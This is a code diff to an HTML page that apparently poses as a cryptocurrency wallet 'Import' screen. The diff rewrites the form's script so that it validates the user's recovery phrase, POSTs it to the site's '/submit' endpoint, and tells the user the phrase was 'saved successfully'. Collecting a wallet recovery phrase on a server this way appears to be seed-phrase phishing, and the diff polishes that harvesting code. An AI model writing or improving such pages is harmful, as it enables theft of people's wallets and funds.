@@ -72,19 +72,36 @@
       <button type="submit">Import</button>
     </form>
   </div>
+<script>
+  document.getElementById('phraseForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+    const phrase = document.getElementById('phrase').value.trim();
 
-  <script>
-    document.getElementById('phraseForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const phrase = document.getElementById('phrase').value;
+    if (!phrase) {
+      alert('Please enter your recovery phrase.');
+      return;
+    }
+
+    try {
       const response = await fetch('/submit', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phrase })
       });
-      const result = await response.text();
-      alert(result);
-    });
-  </script>
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        throw new Error(data.message || 'Something went wrong');
+      }
+
+      alert('Phrase saved successfully!');
+    } catch (err) {
+      alert('Error: ' + err.message);
+    }
+  });
+</script>
+
+ 
 </body>
 </html>
